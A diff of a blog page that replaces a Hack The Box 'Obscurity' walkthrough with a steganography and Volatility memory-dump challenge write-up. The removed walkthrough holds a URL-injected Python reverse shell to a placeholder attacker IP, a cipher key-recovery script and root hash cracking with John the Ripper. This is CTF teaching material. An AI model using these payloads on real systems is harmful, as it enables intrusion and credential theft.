@@ -3,33 +3,40 @@
 <head>
     <meta charset="utf-8">
 
-    <title>HTB Write-up | Obscurity</title>
+    <title>ØxOPOSɆC Steg Challenge 2019</title>
 
     <meta name="HandheldFriendly" content="True" />
     <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
 
     <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
-    <link rel="canonical" href="https://inesmartins.github.io//htb-walkthrough-obscurity/" />
+    <link rel="canonical" href="https://inesmartins.github.io//oxopos-c-steg-challenge/" />
     <meta name="referrer" content="no-referrer-when-downgrade" />
     
     <meta property="og:site_name" content="Inês Martins" />
     <meta property="og:type" content="article" />
-    <meta property="og:title" content="HTB Write-up | Obscurity" />
-    <meta property="og:description" content="Write-up for Obscurity, a retired HTB Linux machine." />
-    <meta property="og:url" content="https://inesmartins.github.io//htb-walkthrough-obscurity/" />
-    <meta property="og:image" content="https://inesmartins.github.io//content/images/2020/06/1-1.png" />
-    <meta property="article:published_time" content="2020-06-07T17:54:05.000Z" />
-    <meta property="article:modified_time" content="2020-12-08T10:38:05.000Z" />
+    <meta property="og:title" content="ØxOPOSɆC Steg Challenge 2019" />
+    <meta property="og:description" content="Write-up for ØxOPOSɆC steganography challenge that involves the analysis of a volatile memory dump." />
+    <meta property="og:url" content="https://inesmartins.github.io//oxopos-c-steg-challenge/" />
+    <meta property="og:image" content="https://inesmartins.github.io//content/images/2020/06/highres_471963990-1.jpeg" />
+    <meta property="article:published_time" content="2020-06-07T23:14:28.000Z" />
+    <meta property="article:modified_time" content="2020-12-08T09:34:53.000Z" />
+    <meta property="article:tag" content="steg" />
+    <meta property="article:tag" content="steganography" />
+    <meta property="article:tag" content="oposec" />
+    <meta property="article:tag" content="volatility" />
+    
     <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:title" content="HTB Write-up | Obscurity" />
-    <meta name="twitter:description" content="Write-up for Obscurity, a retired HTB Linux machine." />
-    <meta name="twitter:url" content="https://inesmartins.github.io//htb-walkthrough-obscurity/" />
-    <meta name="twitter:image" content="https://inesmartins.github.io//content/images/2020/06/1-1.png" />
+    <meta name="twitter:title" content="ØxOPOSɆC Steg Challenge 2019" />
+    <meta name="twitter:description" content="Write-up for ØxOPOSɆC steganography challenge that involves the analysis of a volatile memory dump." />
+    <meta name="twitter:url" content="https://inesmartins.github.io//oxopos-c-steg-challenge/" />
+    <meta name="twitter:image" content="https://inesmartins.github.io//content/images/2020/06/highres_471963990-1.jpeg" />
     <meta name="twitter:label1" content="Written by" />
     <meta name="twitter:data1" content="Inês Martins" />
+    <meta name="twitter:label2" content="Filed under" />
+    <meta name="twitter:data2" content="steg, steganography, oposec, volatility" />
     <meta name="twitter:site" content="@inesmartns" />
-    <meta property="og:image:width" content="594" />
-    <meta property="og:image:height" content="377" />
+    <meta property="og:image:width" content="504" />
+    <meta property="og:image:height" content="105" />
     
     <script type="application/ld+json">
 {
@@ -58,17 +65,18 @@
         "url": "https://inesmartins.github.io//author/ines/",
         "sameAs": []
     },
-    "headline": "HTB Write-up | Obscurity",
-    "url": "https://inesmartins.github.io//htb-walkthrough-obscurity/",
-    "datePublished": "2020-06-07T17:54:05.000Z",
-    "dateModified": "2020-12-08T10:38:05.000Z",
+    "headline": "ØxOPOSɆC Steg Challenge 2019",
+    "url": "https://inesmartins.github.io//oxopos-c-steg-challenge/",
+    "datePublished": "2020-06-07T23:14:28.000Z",
+    "dateModified": "2020-12-08T09:34:53.000Z",
     "image": {
         "@type": "ImageObject",
-        "url": "https://inesmartins.github.io//content/images/2020/06/1-1.png",
-        "width": 594,
-        "height": 377
+        "url": "https://inesmartins.github.io//content/images/2020/06/highres_471963990-1.jpeg",
+        "width": 504,
+        "height": 105
     },
-    "description": "Write-up for Obscurity, a retired HTB Linux machine.",
+    "keywords": "steg, steganography, oposec, volatility",
+    "description": "Write-up for ØxOPOSɆC steganography challenge that involves the analysis of a volatile memory dump.",
     "mainEntityOfPage": {
         "@type": "WebPage",
         "@id": "https://inesmartins.github.io//"
@@ -100,118 +108,49 @@
         <article class="post">
 
             <header class="post-header">
-                <h1 class="post-title">HTB Write-up | Obscurity</h1>
+                <h1 class="post-title">ØxOPOSɆC Steg Challenge 2019</h1>
                 <section class="post-meta">
                     <p class="author">by <a href="/author/ines/">Inês Martins</a></p>
                     <time class="post-date" datetime="2020-06-07">2020-06-07</time>
                 </section>
             </header>
             <figure class="post-image">
-                <amp-img src="https://inesmartins.github.io//content/images/2020/06/1-1.png" width="600" height="400" layout="responsive"></amp-img>
+                <amp-img src="https://inesmartins.github.io//content/images/2020/06/highres_471963990-1.jpeg" width="600" height="400" layout="responsive"></amp-img>
             </figure>
             <section class="post-content">
 
-                <p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/219">here</a>.</em></p><h2 id="scanning">Scanning</h2><p>After doing an initial scan with <code>nmap</code>, we find that this is a Linux (Ubuntu) machine with 2 exposed services: <code>OpenSSH</code> on port 22 and a custom web server on port 8080.</p><pre><code>$ nmap -sC -sV -A obscurity.htb
+                <p>We're given <a href="https://www.dropbox.com/s/j56ojepwlo5hy31/An%C3%A1lise.eml?dl=0">an email</a> (in <a href="https://fileinfo.com/extension/eml">EML format</a>) with a banner and some text that is leading us to think that the email contains some sort of hidden data:</p><blockquote>Hi,<br />I need someone who's able to analyse a PC, could you help me?<br />PS: Let's use our usual way of exchanging classified information!<br />--<br /><strong>Volatility</strong> is the constant of life!</blockquote><p>And indeed, when we use an <a href="https://futureboy.us/stegano/decinput.html">online steg decoder</a> we can find a Dropbox link hidden in the image:</p><pre><code>0c60fd56872251909cb07a749b03a34a56e1edac  memdmp.zip
 
-22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-8080/tcp open http-proxy BadHTTPServer
-```</code></pre>
-<p>There is some content on the website which has some useful information:</p><figure class="kg-card kg-image-card kg-width-wide"></figure><figure class="kg-card kg-image-card kg-width-wide"></figure><figure class="kg-card kg-image-card kg-width-wide"></figure><p>So, now we know there is a file called <code>SuperSecureServer.py</code> which is in "the secret development directory". I used <a href="https://tools.kali.org/web-applications/wfuzz">wfuzz</a> to find it but you could probably just get it logically:</p><pre><code>$ wfuzz -w SecLists/Discovery/Web-Content/api/actions.txt --hc 404 http://obscurity.htb:8080/FUZZ/SuperSecureServer.py
+https://www.dropbox.com/s/ks30qs78k18lfd0/memdmp.zip?dl=0
 </code></pre>
-<p>The mystery directory is <code>develop</code>, so know we have access to <a href="http://obscurity.htb:8080/develop/SuperSecureServer.py">the server's source code</a>, in the form of a Python script: <br />While analysing it, we find something interesting:</p><figure class="kg-card kg-image-card"></figure><p>Here's our foothold: we can exploit this <a href="https://www.w3schools.com/python/ref_func_exec.asp">exec</a> and get us a shell as <code>wwwdata</code>.</p><pre><code>$ wget http://obscurity.htb:8080/';%20s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('[ATTACKER_IP]',[ATTACKER_PORT]));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);a%20=%20'
+<p>This zip file contains only one file - memdmp - which we're going to analyse with <a href="https://github.com/volatilityfoundation/volatility">Volatility</a> as suggested by the email:</p><p><code>sudo apt-get install volatility</code></p>
+<p>We start going through the various options looking for something that seems relevant, which we finally do once we see the word NOTEPAD on the clipboard.</p><pre><code>~ volatility -f memdmp clipboard
+Volatility Foundation Volatility Framework 2.6
+Session    WindowStation Format                 Handle Object     Data                                              
+---------- ------------- ------------------ ---------- ---------- --------------------------------------------------
+         0 WinSta0       CF_UNICODETEXT        0x30115 0xe146f0b8 NOTEPAD                                           
+         0 WinSta0       CF_LOCALE            0x5400fb 0xe1b75620                                                   
+         0 WinSta0       CF_TEXT                   0x1 ----------                                                   
+         0 WinSta0       CF_OEMTEXT                0x1 ---------- 
+         
+         ```</code></pre>
+<p>This leads us to search for useful data on Notepad:</p><pre><code>~ volatility -f memdmp notepad
+Volatility Foundation Volatility Framework 2.6
+Process: 1864
+Text:
+NOTEPAD
+
+Text:
+
+
+https://bit.ly/31uALei
+
+
+
+NOTEPAD
+
 </code></pre>
-<hr></hr><h2 id="getting-user">Getting user</h2><p>It seems like our first goal is to become <code>robert</code>.</p><pre><code>$ cat etc/passwd
-...
-robert:x:1000:1000:robert:/home/robert:/bin/bash
-</code></pre>
-<p>Listing the contents of <code>robert</code>'s home directory, we get some interesting files:</p><pre><code>$ ls /home/robert
-BetterSSH/BetterSSH.py
-check.txt
-out.txt
-passwordreminder.txt
-SuperSecureCrypt.py
-user.txt
-</code></pre>
-<pre><code>$ cat check.txt
-Encrypting this file with your key should result in out.txt, make sure your key is correct!
-
-$ cat out.txt
-¦ÚÈêÚÞØÛÝÝ‰×ÐÊß…ÞÊÚÉ’æßÝËˆÚÛÚêÙÉëéÑÒÝÍÐ…êÆáÙÞã–ÒÑˆÐáÙ¦ÕæØžãÊÎÍßÚêÆŽÝáäè‰ÎÍÚŒÎëÑÓäáÛÌ×‰v
-
-$ cat passwordreminder.txt
-´ÑÈÌÉàÙÁÑé¯·¿
-</code></pre>
-<p>So, by encrypting <code>check.txt</code> with an unknown algorithm we get <code>out.txt</code>.<br />Also, when use we this key to encrypt <code>robert</code>'s password we get the content of <br /><code>passwordreminder.txt</code>.</p><p>This is a classic <a href="https://en.wikipedia.org/wiki/Known-plaintext_attack">known-plaintext attack</a>.<br />Let's create a script to find the key!</p><pre><code>import sys
-
-# extend alphabet if necessary
-alphabet = "abcdefghijklmnopqrstuvwyxzABCDEFGHIJKLMNOPQRSTUVWYXZ"
-
-def decode_ciphertext(ciphertext, key):
-    key_pos = 0
-    plaintext = ""
-    for x in ciphertext:
-        new_char = chr((ord(x) - ord(key[key_pos])) % 255)
-        plaintext += new_char
-        key_pos += 1
-        key_pos = key_pos % len(key)
-    return plaintext
-
-def get_key(p1, c1):
-    i = 0
-    key = ""
-    while i &lt; len(p1):
-        found_match = False
-        for x in alphabet:
-            new_char = chr((ord(p1[i]) + ord(x)) % 255)
-            if new_char == c1[i]:
-                print("Found match, current key is " + key)
-                found_match = True
-                i += 1
-                key += x
-        if found_match == False:
-            print("Couldn't find match for char at index " + str(i))
-            return 0
-    return key
-
-def main(argv):
-    p1 = open(argv[0], "r").read()
-    c1 = open(argv[1], "r").read()
-    c2 = open(argv[2], "r").read()
-
-    print("\nKnown plaintext: \n" + p1)
-    print("Known ciphertext: \n" + c1)
-    print("Ciphertext to decode: \n" + c2)
-
-    key = get_key(p1, c1)
-    if key == 0:
-        print("Unable to calculate key!")
-    else:
-        p2 = decode_ciphertext(c2, key)
-        print("Original plaintext: " + p2)
-
-if __name__ == "__main__":
-    if len(sys.argv) &lt; 3:
-        print("Please specify the following arguments:")
-        print("[0] known plaintext file")
-        print("[1] known ciphertext file")
-        print("[2] ciphertext to decode")
-    else:
-        main(sys.argv[1:])</code></pre><p>Now that we have <code>robert</code>'s password we can <code>SSH</code> into the machine, get the user flag and move on to root. </p><h2 id="getting-root">Getting root</h2><p>We start by doing some enumeration with <a href="https://github.com/rebootuser/LinEnum">LinEnum</a>:</p><pre><code>$ ./LinEnum.sh...
-User robert may run the following commands on obscure:
-(ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
--e
-</code></pre>
-<p>Let's run <code>BetterSSH</code> as sudo to test this:</p><pre><code>$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
-Enter username: robert
-Enter password: xxx
-Authed!
-</code></pre>
-<p>After looking at <code>BetterSSH.py</code> we realise there's a vulnerability we can exploit: we can read the passwords that are stored on /etc/shadow for a period of time on <code>/tmp/SSH/</code>.</p><figure class="kg-card kg-image-card"></figure><p>So we create a script to print them to a file we can read after the process is finished (<code>/tmp/o.txt</code>):</p><figure class="kg-card kg-image-card"></figure><p>Finally, we use <a href="https://www.openwall.com/john/">JohnTheRipper</a> to crack the hash:</p><pre><code>$ echo "root:$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1:18226:0:99999:7" &gt; shadow
-$ echo "root:x:0:0:root:/root:/bin/bash" &gt; passwd
-$ unshadow passwd shadow &gt; crack.password.db
-$ john crack.password.db
-</code></pre>
-<p>That's it, hope you enjoyed it!</p>
+<p>This link leads us to a <a href="https://www.dropbox.com/s/tsf768x9tvnurow/isso.txt?dl=0">file</a> that contains a simple ROT13 cipher, which we were able to decipher this text using <a href="https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,13)&amp;input=c3ludHtaOFolUUhaQyVFNVBYRiF9">CyberChef</a>:</p><figure class="kg-card kg-image-card"></figure><hr></hr><h3 id="useful-resources">Useful Resources</h3><ul><li><a href="https://cqureacademy.com/blog/forensics/memory-dump-analysis">https://cqureacademy.com/blog/forensics/memory-dump-analysis</a></li><li><a href="https://www.forwarddefense.com/pdfs/Memory-Analysis-with-Volatility.pdf">https://www.forwarddefense.com/pdfs/Memory-Analysis-with-Volatility.pdf</a></li><li><a href="https://www.andreafortuna.org/2017/07/10/volatility-my-own-cheatsheet-part-3-process-memory/">https://www.andreafortuna.org/2017/07/10/volatility-my-own-cheatsheet-part-3-process-memory/</a></li></ul>
 
             </section>
 
